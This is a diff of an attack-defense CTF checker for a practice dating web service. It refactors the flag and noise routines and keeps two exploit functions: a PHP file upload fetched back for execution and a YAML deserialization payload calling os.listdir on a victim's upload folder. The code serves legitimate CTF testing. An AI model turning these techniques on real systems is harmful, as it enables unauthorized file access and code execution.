@@ -7,6 +7,7 @@ import secrets
 import re
 from hashlib import md5
 import binascii
+import os
 
 
 from typing import Optional
@@ -39,7 +40,7 @@ Checker config
 SERVICE_PORT = 8080
 checker = Enochecker("imagidate", SERVICE_PORT)
 app = lambda: checker.app
-
+IMAGES_DIR = "Images"
 
 """
 Utility functions
@@ -56,6 +57,84 @@ def assert_response(
         if errmsg is None:
             errmsg = f"{res.request.method} {res.request.url.path} failed with {res.text}"
         raise MumbleException(errmsg)
+
+async def register_user(logger: LoggerAdapter, client: AsyncClient):
+    username: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
+    password: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
+    age = random.randint(20,45)
+    gender = secrets.choice(["Male", "Female", "Other"])
+
+    data = {
+        "username" : username,
+        "password" : password,
+        "confirm_password" : password,
+        "age" : age,
+        "gender" : gender
+    }
+    register_res = await client.post("/register.php", data=data)
+    assert_response(logger,register_res,"Registration successful")
+
+    return username, password
+
+async def login_user(username, password, logger, client: AsyncClient):
+    data = {
+        "username" : username,
+        "password" : password,
+    }
+    login_res = await client.post("/login.php", data=data, follow_redirects=True)
+    assert_response(logger, login_res, "Profile of")
+
+    return login_res.text
+
+def get_user_id(text):
+    id_match = re.search(r'action="/profile\.php\?id=(\d+)"', text)
+    user_id = id_match.group(1)
+    return user_id
+
+async def post_comment(comment: str, public: bool, user_id, logger, client):
+    if public:
+        data = {
+            "comment_text" : comment,
+            "is_public": 1
+        }
+
+    else:
+        data = {
+            "comment_text" : comment
+        }
+
+    putflag_res = await client.post(f"/profile.php?id={user_id}", data=data)
+    assert_response(logger, putflag_res, "Comment added successfully")
+
+async def request_match(username, punchline, custom_filename, logger, client):
+    if custom_filename is not None:
+        data = {
+            "username" : username,
+            "age" : random.randint(20,45),
+            "gender" : secrets.choice(["Male", "Female", "Other"]),
+            "requested_username" : secrets.choice(["habibi", "habibti"]),
+            "punchline" : punchline,
+            "custom_filename" : custom_filename
+        }
+    else:
+        data = {
+            "username" : username,
+            "age" : random.randint(20,45),
+            "gender" : secrets.choice(["Male", "Female", "Other"]),
+            "requested_username" : secrets.choice(["habibi", "habibti"]),
+            "punchline" : punchline,
+        }
+
+    match_res = await client.post("/match.php", data=data)
+    assert_response(logger, match_res, "Data sent succesfully")
+
+async def upload_image(logger, client):
+    image_path = f"{IMAGES_DIR}/{secrets.choice(images)}"
+    print(image_path)
+    f = open(image_path, "rb")
+    file = {"image": ("profile.jpg", f)}
+    upload_res = await client.post("/upload.php", files=file, follow_redirects=True)
+    assert_response(logger, upload_res, "Profile of")
 
 punchlines = [
     "Hi! How's your day going?",
@@ -80,6 +159,109 @@ punchlines = [
     "If you could have dinner with any three people, dead or alive, who would they be?"
 ]
 
+life_facts = [
+    "I love coding at night",
+    "My cat's name is Pixel",
+    "I learned Python in school",
+    "Coffee fuels my mornings",
+    "I collect vintage computers",
+    "Reading sci-fi is my hobby",
+    "I run marathons for fun",
+    "I write poetry in secret",
+    "My favorite food is sushi",
+    "I speak three languages fluently",
+    "I play guitar and sing",
+    "I travel to new countries yearly",
+    "I enjoy painting landscapes",
+    "I am a fan of Linux",
+    "I dislike social media",
+    "I meditate every morning",
+    "My dog’s name is Binary",
+    "I teach coding to kids",
+    "I bike to work daily",
+    "I practice yoga every evening",
+    "I love hiking mountains",
+    "I garden on weekends",
+    "I brew my own beer",
+    "I compose electronic music",
+    "I build robots as a hobby",
+    "I love board games nights",
+    "I write my own blog",
+    "I volunteer at animal shelters",
+    "I am a fan of Star Trek",
+    "I enjoy solving puzzles",
+    "I participate in hackathons",
+    "I have a twin brother",
+    "I cook Italian dishes",
+    "I enjoy stargazing",
+    "I collect comic books",
+    "I am a history buff",
+    "I play chess competitively",
+    "I love baking bread",
+    "I make origami sculptures",
+    "I read biographies frequently",
+    "I dance salsa",
+    "I run a small business",
+    "I am learning Mandarin",
+    "I kayak in the summer",
+    "I enjoy classical music",
+    "I am an amateur photographer",
+    "I like Linux and hate Windows"
+]
+
+private_facts = [
+    "I have a secret tattoo",
+    "I'm afraid of heights",
+    "I struggle with anxiety",
+    "I once cheated on a test",
+    "I secretly love reality TV",
+    "I’m estranged from my sibling",
+    "I have a phobia of spiders",
+    "I lied on my resume",
+    "I still sleep with a teddy bear",
+    "I’ve never been kissed",
+    "I have a hidden bank account",
+    "I’m insecure about my looks",
+    "I was bullied in school",
+    "I secretly dislike my job",
+    "I’ve been in therapy for years",
+    "I feel lonely often",
+    "I’m afraid of public speaking",
+    "I had a secret relationship",
+    "I regret not finishing college",
+    "I once stole something small",
+    "I have trust issues",
+    "I fake confidence at work",
+    "I suffer from imposter syndrome",
+    "I’ve never told anyone my dreams",
+    "I cry easily",
+    "I have a chronic illness",
+    "I’ve been ghosted before",
+    "I’m scared of being alone",
+    "I don’t like my best friend",
+    "I have a secret talent",
+    "I fear disappointing my parents",
+    "I’ve lied about my age",
+    "I have nightmares frequently",
+    "I hide my true feelings",
+    "I’ve broken someone’s heart",
+    "I’m embarrassed by my past",
+    "I feel inadequate often",
+    "I dislike my partner’s family",
+    "I’m scared of getting old",
+    "I envy my friends’ lives",
+    "I worry about money constantly",
+    "I’ve struggled with addiction",
+    "I feel trapped in my life",
+    "I have body image issues",
+    "I wish I were someone else",
+    "I’ve kept secrets from my partner",
+    "I worry I’ll never be happy",
+    "I fear people don’t like me",
+    "I struggle with depression"
+]
+
+images  = os.listdir(IMAGES_DIR)
 """
 CHECKER FUNCTIONS
 """
@@ -90,46 +272,23 @@ async def putflag_db(
     db: ChainDB,
     client: AsyncClient,
     logger: LoggerAdapter,    
-) -> None:
+):
     
-    # reguster and login
-    username: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
-    password: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
-    age = random.randint(20,45)
-    gender = secrets.choice(["Male", "Female", "Other"])
+    # register and login
+    username, password = await register_user(logger, client)
+    login_res = await login_user(username,password, logger, client)
 
-    data = {
-        "username" : username,
-        "password" : password,
-        "confirm_password" : password,
-        "age" : age,
-        "gender" : gender
-    }
-    register_res = await client.post("/register.php", data=data)
-    assert_response(logger,register_res,"Registration successful")
-
-    data = {
-        "username" : username,
-        "password" : password,
-    }
-    login_res = await client.post("/login.php", data=data, follow_redirects=True)
-    assert_response(logger, login_res, "Profile of")
-    
     # find user_id
-    id_match = re.search(r'action="/profile\.php\?id=(\d+)"', login_res.text)
-    user_id = id_match.group(1)
+    user_id = get_user_id(login_res)
 
     # deploy flag
-    flag = task.flag
-    data = {
-        "comment_text" : flag
-    }
-    putflag_res = await client.post(f"/profile.php?id={user_id}", data=data)
-    assert_response(logger, putflag_res, "Comment added successfully")
+    await post_comment(task.flag, False, user_id, logger, client)
 
+    # save user in db
     await db.set("userdata", (username, password, user_id))
-    
-    return f"User: {username}" #ID: {user_id}"
+
+    # return username for the attackinfo
+    return f"User: {username}"
 
 @checker.getflag(0)
 async def getflag_db(
@@ -139,15 +298,16 @@ async def getflag_db(
     logger: LoggerAdapter,
 ) -> None:
     
+    # get username, password from db
     try:
         username, password, user_Id = await db.get("userdata")
     except KeyError:
         raise MumbleException("Missing database entry from putflag")
 
-    data = {"username": username, "password": password}
-    login_res = await client.post("/login.php", data=data, follow_redirects=True)
-    assert_response(logger, login_res, "Profile of")
+    # login
+    login_res = await login_user(username,password, logger, client)
 
+    # search flag
     profile_res = await client.get(f"/profile.php?id={user_Id}")
     assert_in(task.flag, profile_res.text, "FLAG NOT FOUND")
 
@@ -159,47 +319,20 @@ async def putflag_api(
     logger: LoggerAdapter,
 ):
     
-    # reguster and login
-    username: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
-    password: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
-    age = random.randint(20,45)
-    gender = secrets.choice(["Male", "Female", "Other"])
-
-    data = {
-        "username" : username,
-        "password" : password,
-        "confirm_password" : password,
-        "age" : age,
-        "gender" : gender
-    }
-    register_res = await client.post("/register.php", data=data)
-    assert_response(logger,register_res,"Registration successful")
-
-    data = {
-        "username" : username,
-        "password" : password,
-    }
-    login_res = await client.post("/login.php", data=data, follow_redirects=True)
-    assert_response(logger, login_res, "Profile of")
-
+    # register and login
+    username, password = await register_user(logger, client)
+    login_res = await login_user(username, password, logger, client)
+    
     # find user_id
-    id_match = re.search(r'action="/profile\.php\?id=(\d+)"', login_res.text)
-    user_id = id_match.group(1)
+    user_id = get_user_id(login_res)
 
     # deploy flag
-    data = {
-        "username" : username,
-        "age" : age,
-        "gender" : gender,
-        "requested_username" : secrets.choice(["habibi", "habibti"]),
-        "punchline" : secrets.choice(punchlines),
-        "custom_filename" : task.flag
-    }
-    match_res = await client.post("/match.php", data=data)
-    assert_response(logger, match_res, "Data sent succesfully")
+    await request_match(username, secrets.choice(punchlines), task.flag, logger, client)
 
+    # save user in db
     await db.set("userdata", (username, password, user_id))
     
+    # return username for the attackinfo
     return f"User: {username}"    
 
 @checker.getflag(1)
@@ -208,17 +341,18 @@ async def getflag_api(
     db: ChainDB,
     client: AsyncClient,
     logger: LoggerAdapter,
-):
+) -> None:
     
+    # get username, password from db
     try:
         username, password, user_Id = await db.get("userdata")
     except KeyError:
         raise MumbleException("Missing database entry from putflag")
 
-    data = {"username": username, "password": password}
-    login_res = await client.post("/login.php", data=data, follow_redirects=True)
-    assert_response(logger, login_res, "Profile of")
+    # login
+    login_res = await login_user(username, password, logger, client)
 
+    # search flag
     data = {
         "username" : username
     }
@@ -226,78 +360,79 @@ async def getflag_api(
     output = profile_res.content.replace(b"\\\\", b"\\").decode("unicode-escape")
     assert_in(task.flag.encode().hex(), output, "FLAG NOT FOUND")
 
-#@checker.putnoise(0)
-#async def putnoise0(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
-#    logger.debug(f"Connecting to the service")
-#    welcome = await conn.reader.readuntil(b">")
-#
-#    # First we need to register a user. So let's create some random strings. (Your real checker should use some better usernames or so [i.e., use the "faker¨ lib])
-#    username = "".join(
-#        random.choices(string.ascii_uppercase + string.digits, k=12)
-#    )
-#    password = "".join(
-#        random.choices(string.ascii_uppercase + string.digits, k=12)
-#    )
-#    randomNote = "".join(
-#        random.choices(string.ascii_uppercase + string.digits, k=36)
-#    )
-#
-#    # Register another user
-#    await conn.register_user(username, password)
-#
-#    # Now we need to login
-#    await conn.login_user(username, password)
-#
-#    # Finally, we can post our note!
-#    logger.debug(f"Sending command to save a note")
-#    conn.writer.write(f"set {randomNote}\n".encode())
-#    await conn.writer.drain()
-#    await conn.reader.readuntil(b"Note saved! ID is ")
-#
-#    try:
-#        noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
-#    except Exception as ex:
-#        logger.debug(f"Failed to retrieve note: {ex}")
-#        raise MumbleException("Could not retrieve NoteId")
-#
-#    assert_equals(len(noteId) > 0, True, message="Empty noteId received")
-#
-#    logger.debug(f"{noteId}")
-#
-#    # Exit!
-#    logger.debug(f"Sending exit command")
-#    conn.writer.write(f"exit\n".encode())
-#    await conn.writer.drain()
-#
-#    await db.set("userdata", (username, password, noteId, randomNote))
-#        
-#@checker.getnoise(0)
-#async def getnoise0(task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
-#    try:
-#        (username, password, noteId, randomNote) = await db.get('userdata')
-#    except:
-#        raise MumbleException("Putnoise Failed!") 
-#
-#    logger.debug(f"Connecting to service")
-#    welcome = await conn.reader.readuntil(b">")
-#
-#    # Let's login to the service
-#    await conn.login_user(username, password)
-#
-#    # Let´s obtain our note.
-#    logger.debug(f"Sending command to retrieve note: {noteId}")
-#    conn.writer.write(f"get {noteId}\n".encode())
-#    await conn.writer.drain()
-#    data = await conn.reader.readuntil(b">")
-#    if not randomNote.encode() in data:
-#        raise MumbleException("Resulting flag was found to be incorrect")
-#
-#    # Exit!
-#    logger.debug(f"Sending exit command")
-#    conn.writer.write(f"exit\n".encode())
-#    await conn.writer.drain()
-#
-#
+@checker.putnoise(0)
+async def putnoise_profile(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, client: AsyncClient):
+    
+    # register and login
+    username, password = await register_user(logger, client)
+    login_res = await login_user(username,password, logger, client)
+
+    # find user_id
+    user_id = get_user_id(login_res)
+
+
+    # post some comments
+    comment_1 = secrets.choice(life_facts)
+    comment_2 = secrets.choice(life_facts)
+    comment_3 = secrets.choice(private_facts)
+    comment_4 = secrets.choice(private_facts)
+    await post_comment(comment_1, True, user_id, logger, client)
+    await post_comment(comment_2, True, user_id, logger, client)
+    await post_comment(comment_3, False, user_id, logger, client)
+    await post_comment(comment_4, False, user_id, logger, client)
+
+    # upload a profile picture
+    await upload_image(logger, client)
+
+    await db.set("userdata", (username, password, user_id, comment_1, comment_2, comment_3, comment_4))
+        
+@checker.getnoise(0)
+async def getnoise_profile(task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, client: AsyncClient):
+    try:
+        (username, password, user_id, comment_1, comment_2, comment_3, comment_4) = await db.get('userdata')
+    except:
+        raise MumbleException("Putnoise Failed!") 
+
+    login_res = await login_user(username, password, logger, client)
+
+    assert_in(comment_1, login_res, "Comment not Found")
+    assert_in(comment_2, login_res, "Comment not Found")
+    assert_in(comment_3, login_res, "Comment not Found")
+    assert_in(comment_4, login_res, "Comment not Found")
+
+@checker.putnoise(1)
+async def putnoise_match(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, client: AsyncClient):
+    username, password = await register_user(logger, client)
+    login_res = await login_user(username,password, logger, client)
+
+    name1: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
+    name2: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
+
+    # find user_id
+    user_id = get_user_id(login_res)
+
+    #await request_match(username, secrets.choice(punchlines), None, logger, client)
+    await request_match(username, secrets.choice(punchlines), name1, logger, client)
+    await request_match(username, secrets.choice(punchlines), name2, logger, client)
+
+    await db.set("userdata", (username, password, user_id, name1, name2))
+
+@checker.getnoise(1)
+async def getnoise_match(task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, client: AsyncClient):
+    try:
+        (username, password, user_id, name1, name2) = await db.get('userdata')
+    except:
+        raise MumbleException("Putnoise Failed!")
+    
+    login_res = await login_user(username, password, logger, client)
+
+    data = {
+        "username" : username
+    }
+    profile_res = await client.post(f"/check_response.php", data=data)
+    assert_in(name1.encode().hex(), profile_res.text, "hex of filename not found")
+    assert_in(name2.encode().hex(), profile_res.text, "hex of filename not found")
+    
 #@checker.havoc(0)
 #async def havoc0(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
 #    logger.debug(f"Connecting to service")
@@ -401,32 +536,9 @@ async def exploit_file_upload(task: ExploitCheckerTaskMessage,
                     client: AsyncClient,
                     logger:LoggerAdapter) -> Optional[str]:
     
-    # reguster and login
-    username: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
-    password: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
-    age = random.randint(20,45)
-    gender = secrets.choice(["Male", "Female", "Other"])
-
-    data = {
-        "username" : username,
-        "password" : password,
-        "confirm_password" : password,
-        "age" : age,
-        "gender" : gender
-    }
-    register_res = await client.post("/register.php", data=data)
-    assert_response(logger,register_res,"Registration successful")
-
-    data = {
-        "username" : username,
-        "password" : password,
-    }
-    login_res = await client.post("/login.php", data=data, follow_redirects=True)
-    assert_response(logger, login_res, "Profile of")
-    
-    # find user_id
-    id_match = re.search(r'action="/profile\.php\?id=(\d+)"', login_res.text)
-    user_id = id_match.group(1)
+    # register and login
+    username, password = await register_user(logger, client)
+    login_res = await login_user(username,password, logger, client)
 
     # upload exploit
     file = {"image": open("exp.php", "rb")}
@@ -437,6 +549,7 @@ async def exploit_file_upload(task: ExploitCheckerTaskMessage,
     hashed_username = md5(username.encode()).hexdigest()
     exp_res = await client.get(f"/uploads/{hashed_username}/exp.php")
 
+    # search flag
     if flag := searcher.search_flag(exp_res.text):
             return flag
 
@@ -451,40 +564,16 @@ async def exploit_yaml_load(task: ExploitCheckerTaskMessage,
                             logger:LoggerAdapter) -> Optional[str]:
     
     victim = task.attack_info.split(" ")[1]
-    username: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
-    password: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
-    age = random.randint(20,45)
-    gender = secrets.choice(["Male", "Female", "Other"])
-
-    data = {
-        "username" : username,
-        "password" : password,
-        "confirm_password" : password,
-        "age" : age,
-        "gender" : gender
-    }
-    register_res = await client.post("/register.php", data=data)
-    assert_response(logger,register_res,"Registration successful")
-
-    data = {
-        "username" : username,
-        "password" : password,
-    }
-    login_res = await client.post("/login.php", data=data, follow_redirects=True)
-    assert_response(logger, login_res, "Profile of")
+    # register and login
+    username, password = await register_user(logger, client)
+    login_res = await login_user(username,password, logger, client)
     
+    # deploy exploit
     hashed_victim = md5(victim.encode()).hexdigest()
-    data = {
-    "username" : username,
-    "age" : age,
-    "gender" : gender,
-    "requested_username" : secrets.choice(["habibi", "habibti"]),
-    "punchline" : f"!!python/object/apply:os.listdir [\"uploads/{hashed_victim}\"]",
-    }
+    punchline = f"!!python/object/apply:os.listdir [\"uploads/{hashed_victim}\"]"
+    await request_match(username, punchline, None, logger, client)
 
-    match_res = await client.post("/match.php", data=data)
-    assert_response(logger, match_res, "Data sent succesfully")
-
+    # search flag
     data = {
         "username" : username
     }
